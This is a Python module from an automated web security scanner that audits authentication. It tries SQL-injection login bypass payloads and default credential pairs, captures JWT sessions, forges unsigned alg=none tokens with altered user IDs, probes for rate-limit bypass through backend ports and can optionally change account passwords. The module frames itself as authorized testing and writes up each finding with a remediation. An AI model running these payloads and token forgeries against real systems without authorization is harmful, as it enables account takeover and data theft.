"""Stage 5: Authentication audit — SQLi bypass, default creds, JWT capture.

Login is the gate to everything authenticated: IDOR, admin functions,
JWT attacks, mass assignment. This module tries the two cheapest keys
first — tautology injection in the identity field, then a tiny default
credential list — and on success captures the session (JWT claims or
verified cookie) as an `identity_credential` asset that IDOR and
authenticated replay consume. Every claim is differential: the failure
baseline is recorded first, and only a token/session/capability the
baseline lacks counts as authenticated.
"""

import re
import secrets
import asyncio

from core.validators import analyze_jwt, redact_secret
from modules.base import BaseModule
from tools.wrappers import curl


LOGIN_PATH_SEEDS = (
    "/login", "/signin", "/sign-in", "/api/login", "/api/auth/login",
    "/api/users/login", "/api/session", "/session",
    "/rest/login", "/auth/login", "/oauth/token",
)

SQLI_IDENTITY_PAYLOADS = (
    "' OR 1=1--",
    "' OR '1'='1",
    "admin'--",
    "' OR 1=1#",
)

# Tiny and standard: stop on first success. This is a liveness check
# for default deployments, not a brute-force campaign. Target-specific
# accounts (lab defaults, harvested emails) arrive via config
# `extra_credentials`, never hardcoded here.
DEFAULT_CREDS = (
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("test", "test"),
    ("demo", "demo"),
    ("user", "user"),
)

ADMIN_PATH_SEEDS = (
    "/admin", "/administration", "/api/admin", "/rest/admin",
)

_JWT_RE = re.compile(r"eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+")


class AuthAudit(BaseModule):
    id = "auth_audit"
    name = "Authentication Audit"
    stage = 5
    detectability = "high"
    depends_on = ["parameter_discovery"]
    active = True

    async def run(self) -> str:
        endpoints = self._login_endpoints()
        if not endpoints:
            self.state.skip_module(self.id, "no login endpoints discovered")
            return "skipped"

        self.profile = await self._profile()
        identities = []
        for endpoint in endpoints[:12]:
            # One endpoint must never eat the module: some paths accept
            # the baseline fast and then stall payload requests
            # server-side (four hanging probes measured at 60s on one
            # target). Forty-five seconds per endpoint, then move on.
            try:
                identity = await asyncio.wait_for(
                    self._try_login(endpoint), timeout=45)
            except asyncio.TimeoutError:
                self.log(f"  {endpoint}: login probing timed out, skipping")
                continue
            if identity:
                identities.append(identity)
                self._store_identity(endpoint, identity)
                # One working session unlocks the follow-ups; more
                # logins are more noise against the same auth system.
                break

        if identities:
            await self._authenticated_follow_ups(identities[0])
            await self._forgery_sweep(identities[0])
            await self._write_access_probes(identities[0])
            if self._cfg().get("test_password_change") is True:
                await self._password_change_probe(identities[0])

        await self._ratelimit_bypass_check(endpoints)
        if self._cfg().get("test_registration_oracle") is True:
            await self._register_oracle()

        self.state.complete_module(self.id)
        self.log(f"Auth audit: {len(identities)} session(s) established")
        return "done"

    # ── Discovery ───────────────────────────────────────────────

    async def _profile(self):
        """Site baseline so a 200-everything SPA cannot fake admin surface."""
        from tools.wrappers import curl_with_status
        from core.site_profile import get_profile
        base_url = self.base_url

        async def fetch(path: str):
            try:
                result = await curl_with_status(base_url.rstrip("/") + path,
                                               timeout=10)
            except Exception:
                return 0, "", ""
            return (result.get("status", 0),
                    result.get("body", "") or "",
                    result.get("content_type", "") or "")

        try:
            return await get_profile(base_url, fetch)
        except Exception:
            return None

    def _cfg(self) -> dict:
        cfg = self.config.get("modules", {}).get(self.id, {})
        return cfg if isinstance(cfg, dict) else {}

    async def _ratelimit_bypass_check(self, endpoints: list) -> None:
        """Front-door throttle vs direct backend port: one burst, one probe.

        Login rate limits often live in the reverse proxy, not the app.
        A handful of bad logins trips the front-door 429; the same login
        sent straight at a backend port the scan fingerprinted (proved
        live: front 429 while :3000 answered 401) defeats spraying
        protection entirely. Bounded: up to 6 front-door tries to find
        the gate, then a single direct request per HTTP-ish port.
        """
        from urllib.parse import urlparse
        gated_endpoint = ""
        gate_note = ""
        for endpoint in endpoints[:6]:
            try:
                result = await curl(
                    endpoint, method="POST",
                    headers={"Content-Type": "application/json"},
                    data=_json_dumps(
                        {"email": "ratelimit-probe-zz9@example.invalid",
                         "password": "wrongpass123"}),
                    output="full", timeout=15)
            except Exception:
                continue
            if result.get("status", 0) == 429:
                gated_endpoint = endpoint
                gate_note = (result.get("body", "") or "")[:150]
                break
        if not gated_endpoint:
            return
        from modules.port_scan_module import _looks_http
        path = urlparse(gated_endpoint).path or "/"
        payload = _json_dumps(
            {"email": "ratelimit-probe-zz9@example.invalid",
             "password": "wrongpass123"})
        for asset in self.state.get_assets_by_type("port"):
            attrs = asset.get("attrs", {}) or {}
            ip = str(attrs.get("ip", "") or "")
            try:
                port = int(attrs.get("port", 0) or 0)
            except (TypeError, ValueError):
                continue
            if not ip or not _looks_http(
                    port, str(attrs.get("service", "")),
                    str(attrs.get("version", ""))):
                continue
            direct = f"http://{ip}:{port}{path}"
            try:
                result = await curl(
                    direct, method="POST",
                    headers={"Content-Type": "application/json",
                             "Host": self.domain},
                    data=payload, output="full", timeout=15)
            except Exception:
                continue
            status = result.get("status", 0)
            if status == 429:
                continue  # gate holds on this port too
            body = (result.get("body", "") or "")[:200]
            if status in (200, 201, 400, 401, 422) and body:
                self.state.add_finding(
                    title="Login Rate Limit Bypass via Direct Backend Port",
                    severity="MEDIUM",
                    confidence="CONFIRMED",
                    category="Broken Authentication",
                    description=(
                        f"{gated_endpoint} throttles repeated failures "
                        f"({gate_note or 'HTTP 429'}), but the same login "
                        f"sent straight to {direct} is processed "
                        f"(HTTP {status}). Brute-force and credential "
                        f"spraying protection lives in the proxy, not "
                        f"the app."),
                    evidence=[f"Front door: HTTP 429 at {gated_endpoint}",
                              f"Direct: HTTP {status} at {direct}: "
                              f"{body[:150]}"],
                    remediation="Enforce the attempt limit in the "
                                "application (or share the counter with "
                                "the proxy), and firewall backend ports "
                                "from the internet.",
                    asset_keys=[f"url:{direct}"],
                    verified=True,
                    verification={"method": "ratelimit_differential",
                                  "url": direct},
                )
                return

    async def _register_oracle(self) -> None:
        """Registration oracle: success vs already-exists differential.

        OPT-IN ONLY (modules.auth_audit.test_registration_oracle: true):
        this creates one real account. A distinct already-exists answer
        for the second identical registration is a user-enumeration
        oracle for phishing and spray-list building.
        """
        candidates = []
        for asset in self.state.get_assets_by_type("api_endpoint"):
            value = str(asset.get("value", "") or "")
            if "register" in value.lower() and value not in candidates:
                candidates.append(value)
        for path in ("/api/auth/register", "/api/register", "/register"):
            url = f"{self.base_url}{path}"
            if url not in candidates:
                candidates.append(url)
        email = f"oracle-probe-{secrets.token_hex(4)}@{self.domain}"
        body_shape = {"email": email, "password": "OracleProbe123!",
                      "name": "oracle probe"}
        first = await self._register_attempt(candidates, body_shape)
        if not first:
            return
        second = await self._register_attempt([first["url"]], body_shape)
        if not second:
            return
        if _reads_registered(first) and _reads_exists(second):
            self.state.add_finding(
                title="User Enumeration via Registration Oracle",
                severity="LOW",
                confidence="CONFIRMED",
                category="Information Disclosure",
                description=(
                    f"Registering {email} succeeded, then registering it "
                    f"again returned a distinct already-exists answer. "
                    f"Attackers can confirm registered addresses. "
                    f"Delete the test account {email}."),
                evidence=[f"First: {first['body'][:150]}",
                          f"Second: {second['body'][:150]}"],
                remediation="Return the same generic response for new "
                            "and existing addresses (send the verification "
                            "mail either way).",
                asset_keys=[f"url:{first['url']}"],
                verified=True,
                verification={"method": "registration_oracle",
                              "url": first["url"]},
            )

    async def _register_attempt(self, urls: list, body: dict) -> dict | None:
        """One registration-shaped POST per candidate URL, first success."""
        import json as _json
        for url in urls[:8]:
            for payload in (dict(body),
                            {"username": body["email"], **body}):
                try:
                    result = await curl(
                        url, method="POST",
                        headers={"Content-Type": "application/json"},
                        data=_json.dumps(payload),
                        output="full", timeout=15)
                except Exception:
                    continue
                text = result.get("body", "") or ""
                if result.get("status", 0) in (200, 201) and text:
                    return {"url": url, "status": result.get("status", 0),
                            "body": text}
        return None

    async def _password_change_probe(self, identity: dict) -> None:
        """Change the session's password without the current one.

        OPT-IN ONLY (modules.auth_audit.test_password_change: true):
        this writes for real — it sets a new password on the test
        account. Off by default; the finding it produces (account
        takeover via stolen session alone, no current-password check)
        justifies the write when the operator asks for it.
        """
        import json as _json
        token = identity.get("token", "")
        if not token or token.startswith("cookie:"):
            return
        auth = {"Authorization": f"Bearer {token}"}
        candidates = []
        for asset in self.state.get_assets_by_type("api_endpoint"):
            value = str(asset.get("value", "") or "")
            if "change-password" in value.lower() or "password" in value.lower():
                candidates.append(value)
        for path in ("/rest/user/change-password", "/api/change-password",
                     "/change-password", "/account/password"):
            url = f"{self.base_url}{path}"
            if url not in candidates:
                candidates.append(url)
        new_password = f"Rotated-By-Audit-{secrets.token_hex(4)}"
        for url in candidates[:5]:
            for method in ("PUT", "POST"):
                for body in ({"password": new_password,
                              "repeatPassword": new_password},
                             {"newPassword": new_password,
                              "repeatNewPassword": new_password}):
                    try:
                        result = await curl(
                            url, method=method,
                            headers={"Content-Type": "application/json",
                                     **auth},
                            data=_json.dumps(body),
                            output="full", timeout=15)
                    except Exception:
                        continue
                    text = result.get("body", "") or ""
                    if result.get("status", 0) in (200, 201) and any(
                            marker in text.lower() for marker in
                            ("success", "updated", "changed")):
                        self.state.add_finding(
                            title=f"Password Change Without Current Verification: {url}",
                            severity="HIGH",
                            confidence="CONFIRMED",
                            category="Broken Authentication",
                            description=(
                                f"{url} accepted a password change with no "
                                f"current-password proof. A stolen session "
                                f"alone takes the account permanently — test "
                                f"password set to a rotated value."),
                            evidence=[f"URL: {url}", f"Method: {method}",
                                      f"Response: {text[:200]}"],
                            remediation="Require the current password (or "
                                        "re-authentication) for every "
                                        "credential change.",
                            asset_keys=[f"url:{url}"],
                            verified=True,
                            verification={
                                "method": "password_change_no_current",
                                "url": url},
                        )
                        return

    def _login_endpoints(self) -> list:
        """Discovered POST endpoints plus login-shaped seeds."""
        found = []
        for asset in self.state.get_assets_by_type("api_endpoint"):
            attrs = asset.get("attrs", {}) or {}
            methods = [m.upper() for m in (attrs.get("methods") or [])]
            value = str(asset.get("value", "") or "")
            lowered = value.lower()
            if "POST" in methods and any(
                    hint in lowered for hint in
                    ("login", "signin", "sign-in", "auth", "session", "token")):
                if value not in found:
                    found.append(value)
        seeds = list(LOGIN_PATH_SEEDS)
        seeds.extend(str(p) for p in self._cfg().get("extra_login_paths", [])
                     if p)
        for path in seeds:
            url = f"{self.base_url}{path}"
            if url not in found:
                found.append(url)
        return found

    # ── Login attempts ──────────────────────────────────────────

    async def _post_login(self, endpoint: str, identity: str,
                          secret: str) -> dict:
        """One login attempt; returns the parsed outcome.

        Returns the last server answer, not just 200s: the failure
        baseline is usually a 401 with a JSON error shape, and discarding
        it blinds both the API gate and the failure markers.
        """
        outcome: dict = {"status": 0, "body": "", "headers": "",
                         "fields": {}}
        for field_set in ({"email": identity, "password": secret},
                          {"username": identity, "password": secret},
                          {"user": identity, "pass": secret}):
            try:
                result = await curl(
                    endpoint, method="POST",
                    headers={"Content-Type": "application/json"},
                    data=_json_dumps(field_set),
                    output="full", timeout=15)
            except Exception:
                continue
            body = result.get("body", "") or ""
            outcome = {"status": result.get("status", 0), "body": body,
                       "headers": result.get("headers", ""),
                       "fields": field_set}
            if result.get("status", 0) in (200, 201) and body:
                return outcome
        return outcome

    async def _try_login(self, endpoint: str) -> dict | None:
        # Failure baseline first: unknown user, wrong password.
        baseline = await self._post_login(
            endpoint, "nonexistent-user-zz9@example.invalid", "wrongpass123")
        baseline_markers = _failure_markers(baseline.get("body", ""))
        # API-shaped responses only: an HTML page (SPA shell, login form)
        # answers 200 to every payload without ever authenticating, so
        # burning SQLi strings on it only tests the 404 page.
        if not _looks_like_api(baseline.get("body", "")):
            return None

        # 1. Tautology injection in the identity field.
        for payload in SQLI_IDENTITY_PAYLOADS:
            outcome = await self._post_login(endpoint, payload, "x")
            token = _extract_token(outcome)
            if token and _differs_from_baseline(outcome, baseline_markers):
                claims = analyze_jwt(token)
                email, role = _identity_from_claims(claims.get("claims", {}))
                return {"technique": "sqli_auth_bypass",
                        "payload": payload, "token": token,
                        "claims": claims.get("claims", {}),
                        "email": email, "role": role}

        # 2. Default credentials, stop on first success. Pack- or
        # operator-supplied pairs go first: a known lab account beats
        # guessing defaults.
        creds = []
        for pair in self._cfg().get("extra_credentials", []) or []:
            if isinstance(pair, (list, tuple)) and len(pair) == 2:
                creds.append((str(pair[0]), str(pair[1])))
        creds.extend(DEFAULT_CREDS)
        for username, password in creds:
            for identity in {username, f"{username}@{self.domain}"}:
                outcome = await self._post_login(endpoint, identity, password)
                token = _extract_token(outcome)
                if token and _differs_from_baseline(outcome, baseline_markers):
                    claims = analyze_jwt(token)
                    email, role = _identity_from_claims(claims.get("claims", {}))
                    return {"technique": "default_credentials",
                            "payload": f"{identity}/{password}",
                            "token": token,
                            "claims": claims.get("claims", {}),
                            "email": email or identity,
                            "role": role}
        return None

    def _store_identity(self, endpoint: str, identity: dict) -> None:
        """identity_credential asset: endpoint, technique, role, token.

        The token is stored whole because IDOR and authenticated replay
        need to send it. State files already hold cookies and secrets;
        a test-session token on an authorized engagement belongs with
        them, redacted everywhere it is displayed.
        """
        token = identity.get("token", "")
        self.state.add_asset(
            "identity_credential",
            f"identity:{identity.get('email') or identity.get('technique')}",
            identity.get("email") or identity.get("technique"),
            confidence="CONFIRMED",
            sources=[self.id],
            attrs={"endpoint": endpoint,
                   "technique": identity.get("technique", ""),
                   "role": identity.get("role", ""),
                   "token": token,
                   "token_preview": redact_secret(token)},
        )
        identity_key = f"identity:{identity.get('email') or identity.get('technique')}"
        endpoint_key = f"url:{endpoint}"
        known = {node.get("key") for node in self.state.assets.get("nodes", [])
                 if node.get("key")}
        if endpoint_key in known:
            self.state.add_edge(identity_key, endpoint_key, "AUTHENTICATES_TO")
        self._audit_token_claims(endpoint, identity)
        technique = identity["technique"]
        if technique == "sqli_auth_bypass":
            title, severity = "SQL Injection Authentication Bypass", "CRITICAL"
            description = (
                f"Tautology payload {identity['payload']!r} at {endpoint} "
                f"returned a live session token. Authentication is bypassed "
                f"without credentials.")
        else:
            title, severity = "Default Credentials Accepted", "HIGH"
            description = (
                f"Credential pair {identity['payload']!r} at {endpoint} "
                f"returned a live session token. Default deployments must "
                f"not survive first contact.")
        self.state.add_finding(
            title=f"{title}: {endpoint}",
            severity=severity,
            confidence="CONFIRMED",
            category="Authentication Bypass",
            description=description,
            evidence=[f"Endpoint: {endpoint}",
                      f"Technique: {technique}",
                      f"Role from token claims: {identity.get('role') or 'n/a'}"],
            remediation="Parameterize authentication queries; enforce unique "
                        "credentials and lockout on login endpoints.",
            asset_keys=[f"url:{endpoint}"],
            verified=True,
            verification={"method": "live_session_token_captured",
                          "url": endpoint},
        )

    # ── Authenticated follow-ups ────────────────────────────────

    def _audit_token_claims(self, endpoint: str, identity: dict) -> None:
        """Sensitive keys inside the captured token's own claims.

        A password hash riding in the JWT payload is exposed to every
        client, proxy log, and error report that touches the token —
        the same exposure class as response bodies, from a different
        mouth.
        """
        from core.validators import (
            RESPONSE_SENSITIVE_KEYS,
            looks_real_value,
            walk_json,
        )
        claims = identity.get("claims", {}) or {}
        hits = []
        for _path, key, value in walk_json(claims):
            severity = RESPONSE_SENSITIVE_KEYS.get(str(key).lower())
            if not severity or not isinstance(value, (str, int)):
                continue
            if looks_real_value(value):
                hits.append((severity, key, value))
        if not hits:
            return
        worst = max(severity for severity, _, _ in hits)
        self.state.add_finding(
            title="Sensitive Keys Inside JWT Claims",
            severity=worst,
            confidence="CONFIRMED",
            category="Sensitive Data Exposure",
            description=(
                f"The session token issued by {endpoint} carries "
                f"{len(hits)} sensitive field(s) "
                f"({', '.join(sorted({k for _, k, _ in hits}))}) inside its "
                f"claims. JWT payloads are base64, not encryption: every "
                f"client, log, and proxy on the path reads them."),
            evidence=[f"{key}: {redact_secret(value)}"
                      for _, key, value in hits[:10]],
            remediation="Keep only identifiers in claims; fetch the rest "
                        "server-side per request.",
            asset_keys=[f"url:{endpoint}"],
            verified=True,
                    verification={"method": "sensitive_jwt_claims",
                                  "url": endpoint},
            )

    async def _authenticated_follow_ups(self, identity: dict) -> None:
        """Spend the captured session where it proves the most: admin
        surface with the real token and with a none-alg forgery."""
        token = identity.get("token", "")
        if not token:
            return
        auth = {"Authorization": f"Bearer {token}"}
        from core.probe_targets import in_scope_url
        admin_urls = []
        for asset in self.state.get_assets_by_type("api_endpoint"):
            value = str(asset.get("value", "") or "")
            if any(hint in value.lower() for hint in
                   ("/admin", "administration", "config")):
                if in_scope_url(value, self.base_url, self.domain):
                    admin_urls.append(value)
        for path in ADMIN_PATH_SEEDS:
            url = f"{self.base_url}{path}"
            if url not in admin_urls:
                admin_urls.append(url)
        for path in self._cfg().get("extra_admin_paths", []) or []:
            url = f"{self.base_url}{path}" if str(path).startswith("/") else str(path)
            if url not in admin_urls:
                admin_urls.append(url)

        none_token = _none_alg_variant(token)
        for url in admin_urls[:8]:
            anon = await _get(url, None)
            authed = await _get(url, auth)
            if not _is_admin_surface(authed, getattr(self, "profile", None)):
                continue
            if _is_admin_surface(anon, getattr(self, "profile", None)):
                self.state.add_finding(
                    title=f"Admin Surface Exposed Without Authentication: {url}",
                    severity="HIGH",
                    confidence="CONFIRMED",
                    category="Broken Access Control",
                    description=(f"{url} serves admin content to anonymous "
                                 f"requests. Missing function-level access control."),
                    evidence=[f"URL: {url}",
                              f"Anonymous: HTTP {anon['status']}, admin markers present"],
                    remediation="Enforce role checks on every admin endpoint, not just the UI.",
                    asset_keys=[f"url:{url}"],
                    verified=True,
                    verification={"method": "anonymous_admin_content", "url": url},
                )
                continue
            # Anonymous is denied but the session sees admin content: try
            # the same request with an unsigned forgery of the same claims.
            forged = await _get(url, {"Authorization": f"Bearer {none_token}"})
            if _responses_match(forged, authed):
                self.state.add_finding(
                    title=f"Unsigned JWT Accepted on Admin Endpoint: {url}",
                    severity="CRITICAL",
                    confidence="CONFIRMED",
                    category="Authentication Bypass",
                    description=(f"{url} answers identically to an alg=none "
                                 f"forgery carrying the captured claims. "
                                 f"Signature verification is missing: anyone "
                                 f"can mint admin sessions."),
                    evidence=[f"URL: {url}",
                              f"Valid token: HTTP {authed['status']}",
                              f"None-alg forgery: HTTP {forged['status']}, same body",
                              f"Anonymous: HTTP {anon['status']} (denied)"],
                    remediation="Reject alg=none unconditionally; pin the algorithm "
                                "and verify signatures with the correct key.",
                    asset_keys=[f"url:{url}"],
                    verified=True,
                    verification={"method": "none_alg_replay_accepted", "url": url},
                )


    async def _forgery_sweep(self, identity: dict) -> None:
        """Replay an unsigned forgery of the captured claims everywhere.

        The captured token's claims (user id, role, email) are re-signed
        with alg=none and presented to API endpoints that deny anonymous
        requests. An endpoint answering the forgery like the valid
        session skips signature verification entirely: authentication
        as anyone, minted locally.
        """
        import base64 as _b64
        import json as _json
        token = identity.get("token", "")
        if not token or token.startswith("cookie:"):
            return
        forged = _none_alg_variant(token)
        if forged == token:
            return
        try:
            claims = _json.loads(_b64.urlsafe_b64decode(
                token.split(".")[1] + "==").decode())
        except Exception:
            claims = {}
        id_mutations = _id_mutations(claims)
        from core.probe_targets import in_scope_url
        targets = []
        for asset in self.state.get_assets_by_type("api_endpoint"):
            value = str(asset.get("value", "") or "")
            if "{id}" in value or "{Id}" in value:
                value = value.replace("{id}", "1").replace("{Id}", "1")
            if value.startswith(("http://", "https://")) \
                    and value not in targets \
                    and in_scope_url(value, self.base_url, self.domain):
                targets.append(value)

        import time as _time_guard
        try:
            _guard_deadline = float(self.config.get("module_timeout", 300) or 300)
        except (TypeError, ValueError):
            _guard_deadline = 300.0
        _stop_at = _time_guard.monotonic() + max(60.0, _guard_deadline - 30.0)
        for url in targets[:10]:
            if _time_guard.monotonic() >= _stop_at:
                break
            anon = await _get(url, None)
            if anon.get("status") not in (401, 403):
                continue
            forged_resp = await _get(
                url, {"Authorization": f"Bearer {forged}"})
            if forged_resp.get("status") != 200:
                continue
            forged_body = forged_resp.get("body", "") or ""
            anon_body = anon.get("body", "") or ""
            if not forged_body or forged_body == anon_body:
                continue
            self.state.add_finding(
                title=f"Unsigned JWT Accepted: {url}",
                severity="CRITICAL",
                confidence="CONFIRMED",
                category="Authentication Bypass",
                description=(
                    f"{url} denies anonymous requests but answers an "
                    f"alg=none forgery carrying captured claims with live "
                    f"data. Signature verification is missing: sessions "
                    f"for any user can be minted locally."),
                evidence=[f"URL: {url}",
                          f"Anonymous: HTTP {anon.get('status')}",
                          f"Forgery: HTTP 200, {len(forged_body)} bytes, "
                          f"differs from denial",
                          f"Response: {forged_body[:250]}"],
                remediation="Reject alg=none unconditionally; pin the "
                            "algorithm and verify signatures with the "
                            "correct key.",
                asset_keys=[f"url:{url}"],
                verified=True,
                verification={"method": "none_alg_replay_accepted",
                              "url": url},
            )
            await self._bola_via_forgery(url, token, id_mutations, anon)
            await self._bola_across_ids(url, forged, anon)

    async def _bola_via_forgery(self, url: str, token: str,
                                id_mutations: list, anon: dict) -> None:
        """Mutate the identity claim inside an unsigned forgery.

        The none-alg token above proves signatures are unchecked; this
        proves authorization is unchecked too. A forged id:2 that returns
        another user's record where the valid session returns our own is
        horizontal access control failure minted locally — no victim
        account needed.
        """
        import base64 as _b64
        import json as _json
        parts = token.split(".")
        if len(parts) != 3:
            return
        try:
            original_claims = _json.loads(_b64.urlsafe_b64decode(
                parts[1] + "==").decode())
        except Exception:
            return
        try:
            original = await _get(
                url, {"Authorization": f"Bearer {token}"})
        except Exception:
            return
        original_body = original.get("body", "") or ""
        if original.get("status") != 200 or not original_body:
            return
        for label, mutated_claims in id_mutations:
            payload = _b64.urlsafe_b64encode(
                _json.dumps(mutated_claims).encode()).decode().rstrip("=")
            header = _b64.urlsafe_b64encode(
                _json.dumps({"alg": "none", "typ": "JWT"}).encode()
            ).decode().rstrip("=")
            forged_token = f"{header}.{payload}."
            mutated = await _get(
                url, {"Authorization": f"Bearer {forged_token}"})
            mutated_body = mutated.get("body", "") or ""
            if mutated.get("status") != 200 or not mutated_body:
                continue
            if mutated_body == original_body or mutated_body == (anon.get("body", "") or ""):
                continue
            self.state.add_finding(
                title=f"BOLA via Forged Identity ({label}): {url}",
                severity="CRITICAL",
                confidence="CONFIRMED",
                category="Broken Access Control",
                description=(
                    f"{url} served a DIFFERENT user's record to an unsigned "
                    f"token carrying mutated identity claims ({label}). "
                    f"Neither the signature nor the ownership is checked: "
                    f"any account's data is retrievable."),
                evidence=[f"URL: {url}", f"Mutation: {label}",
                          f"Own record: {original_body[:150]}",
                          f"Other record: {mutated_body[:150]}"],
                remediation="Verify signatures AND authorize the object "
                            "against the authenticated principal on every "
                            "request.",
                asset_keys=[f"url:{url}"],
                verified=True,
                verification={"method": "bola_unsigned_claim_mutation",
                              "url": url},
            )
            return

    async def _bola_across_ids(self, url: str, forged: str,
                               anon: dict) -> None:
        """Sequential IDs under one forgery: /1 and /2 must not both
        answer with different users' records.

        Only runs on URLs that end in /1 (concretized {id} templates):
        the sibling /2 is the same resource class, so two different
        owners' data under one token is horizontal access failure, not
        two endpoints behaving differently.
        """
        import re as _re
        match = _re.search(r"/1([/?#]|$)", url)
        if not match:
            return
        sibling = url[:match.start()] + "/2" + match.group(1)
        first = await _get(url, {"Authorization": f"Bearer {forged}"})
        second = await _get(sibling, {"Authorization": f"Bearer {forged}"})
        first_body, second_body = (first.get("body", "") or "",
                                   second.get("body", "") or "")
        if first.get("status") != 200 or second.get("status") != 200:
            return
        if not first_body or not second_body or first_body == second_body:
            return
        first_owners = _owner_markers(first_body)
        second_owners = _owner_markers(second_body)
        if not first_owners or not second_owners:
            return
        if first_owners & second_owners:
            return
        self.state.add_finding(
            title=f"BOLA Across Sequential IDs: {url} vs {sibling}",
            severity="HIGH",
            confidence="CONFIRMED",
            category="Broken Access Control",
            description=(
                f"One forged session reads two different owners' records "
                f"({sorted(first_owners)[:3]} vs "
                f"{sorted(second_owners)[:3]}): object authorization is "
                f"absent on this resource."),
            evidence=[f"ID 1: {url} -> {sorted(first_owners)[:5]}",
                      f"ID 2: {sibling} -> {sorted(second_owners)[:5]}"],
            remediation="Authorize every object read against the "
                        "authenticated principal.",
            asset_keys=[f"url:{url}", f"url:{sibling}"],
            verified=True,
            verification={"method": "bola_sequential_ids_forged_session",
                          "url": url},
        )

    async def _write_access_probes(self, identity: dict) -> None:
        """No-op PUTs: write access proven without changing anything.

        Reads an object, writes the identical JSON back, and compares.
        A 200 echo of our own bytes proves the verb is accepted; volatile
        timestamps are normalized out before comparing so clock skew can
        never confirm a write. Anonymous acceptance is HIGH (missing
        function-level auth); session acceptance is MEDIUM context for
        BOLA review, since writing your own record may be legitimate.
        """
        import json as _json
        import time as _time_guard
        try:
            _guard_deadline = float(self.config.get("module_timeout", 300) or 300)
        except (TypeError, ValueError):
            _guard_deadline = 300.0
        _stop_at = _time_guard.monotonic() + max(60.0, _guard_deadline - 30.0)
        token = identity.get("token", "")
        auth = {"Authorization": f"Bearer {token}"} if token else None
        from core.probe_targets import in_scope_url
        candidates = []
        for asset in self.state.get_assets_by_type("api_endpoint"):
            attrs = asset.get("attrs", {}) or {}
            methods = [m.upper() for m in (attrs.get("methods") or [])]
            if not any(m in ("PUT", "PATCH") for m in methods):
                continue
            value = str(asset.get("value", "") or "")
            if "{id}" in value or "{Id}" in value:
                value = value.replace("{id}", "1").replace("{Id}", "1")
            if value not in candidates and in_scope_url(
                    value, self.base_url, self.domain):
                candidates.append(value)

        for url in candidates[:5]:
            if _time_guard.monotonic() >= _stop_at:
                break
            before = await _get(url, None)
            if before["status"] != 200:
                continue
            try:
                document = _json.loads(before["body"])
            except (ValueError, TypeError):
                continue
            for label, headers in (("anonymous", None),
                                   ("session", auth) if auth else ("session", None)):
                if label == "session" and auth is None:
                    continue
                try:
                    result = await curl(
                        url, method="PUT",
                        headers={"Content-Type": "application/json",
                                 **(headers or {})},
                        data=_json.dumps(document),
                        output="full", timeout=15)
                except Exception:
                    continue
                if result.get("status", 0) != 200:
                    continue
                try:
                    after = _json.loads(result.get("body", "") or "")
                except (ValueError, TypeError):
                    continue
                if _json_equal_ignoring_volatile(document, after):
                    severity = "HIGH" if label == "anonymous" else "MEDIUM"
                    self.state.add_finding(
                        title=f"{'Unauthenticated' if label == 'anonymous' else 'Session'} "
                              f"Write Access: {url}",
                        severity=severity,
                        confidence="CONFIRMED",
                        category="Broken Access Control",
                        description=(
                            f"PUT to {url} {'without any session' if label == 'anonymous' else 'with a customer session'} "
                            f"echoed the identical document back: the write verb "
                            f"is accepted{' from the internet' if label == 'anonymous' else ''}. "
                            f"No data was changed (byte-identical round-trip "
                            f"modulo timestamps)."),
                        evidence=[f"URL: {url}", f"As: {label}",
                                  "PUT identical JSON -> HTTP 200, equivalent body"],
                        remediation="Enforce ownership and role checks on write "
                                    "verbs, not just on the UI.",
                        asset_keys=[f"url:{url}"],
                        verified=True,
                        verification={"method": "noop_put_write_access",
                                      "url": url},
                    )
                    break


def _json_equal_ignoring_volatile(first, second) -> bool:
    """Deep equality modulo clock and session-noise keys."""
    volatile = {"updatedat", "updated_at", "modifiedat", "modified_at",
                "updated", "modified", "lastloginip", "last_login_ip",
                "lastlogin", "last_login", "token", "accesstoken"}
    if isinstance(first, dict) and isinstance(second, dict):
        keys = set(first) | set(second)
        for key in keys:
            if str(key).lower() in volatile:
                continue
            if key not in first or key not in second:
                return False
            if not _json_equal_ignoring_volatile(first[key], second[key]):
                return False
        return True
    if isinstance(first, list) and isinstance(second, list):
        return len(first) == len(second) and all(
            _json_equal_ignoring_volatile(a, b)
            for a, b in zip(first, second))
    return first == second


def _reads_registered(attempt: dict) -> bool:
    """First registration looks like success, not an error."""
    if attempt.get("status") not in (200, 201):
        return False
    text = str(attempt.get("body", "") or "").lower()
    return any(marker in text for marker in
               ("success", "created", "welcome", "verify",
                "check your email", "registered"))


def _reads_exists(attempt: dict) -> bool:
    """Second identical registration is distinctly already-exists."""
    text = str(attempt.get("body", "") or "").lower()
    return any(marker in text for marker in
               ("already exists", "already registered", "already in use",
                "already taken", "duplicate", "email taken"))


async def _get(url: str, auth: dict | None) -> dict:
    try:
        result = await curl(url, headers=auth or None,
                            output="full", timeout=15)
    except Exception:
        return {"status": 0, "body": ""}
    return {"status": result.get("status", 0),
            "body": result.get("body", "") or ""}


def _json_dumps(payload: dict) -> str:
    import json as _json
    return _json.dumps(payload)


def _identity_from_claims(claims: dict) -> tuple:
    """(email, role), digging through wrapper claims like {"data": {...}}.

    Juice Shop nests identity under "data"; Auth0-style tokens use
    "email"/"https://.../role". Look through the common shapes instead
    of only the top level.
    """
    if not isinstance(claims, dict):
        return "", ""
    nested = claims.get("data")
    pool = [claims]
    if isinstance(nested, dict):
        pool.append(nested)
    email, role = "", ""
    for scope in pool:
        email = email or str(scope.get("email", "") or "")
        role = role or str(scope.get("role", "") or scope.get("roles", "") or "")
    return email, role


def _looks_like_api(body: str) -> bool:
    """JSON shape or an explicit auth rejection.

    An explicit "Invalid email or password" proves the endpoint
    authenticates — stronger evidence than any shape heuristic. What
    gets skipped is HTML shells and empty answers: endpoints that
    answer 200 to every payload without ever authenticating. Bare
    "login"/"token" substrings do NOT qualify — every SPA shell
    contains a login button, and probing those shells is what burned
    four minutes on dead paths (slow server-side fallthroughs).
    """
    text = str(body or "").strip()
    if not text:
        return False
    if text.startswith(("{", "[")):
        return True
    lowered = text.lower()
    if any(marker in lowered for marker in
           ("invalid", "unauthorized", "unauthorised", "incorrect",
            "wrong password", "unknown user", "bad credentials",
            '"status"', '"error"')):
        return True
    if text.lstrip().startswith("<"):
        return False
    return len(text) < 500


def _failure_markers(body: str) -> set:
    """Normalized shape of a failed login: errors, and no session."""
    lowered = str(body or "").lower()
    markers = set()
    for token in ("invalid", "unauthorized", "unauthorised", "incorrect",
                  "wrong", "failed", "failure", "denied", "error",
                  "not found", "unknown user", "bad credentials"):
        if token in lowered:
            markers.add(token)
    return markers


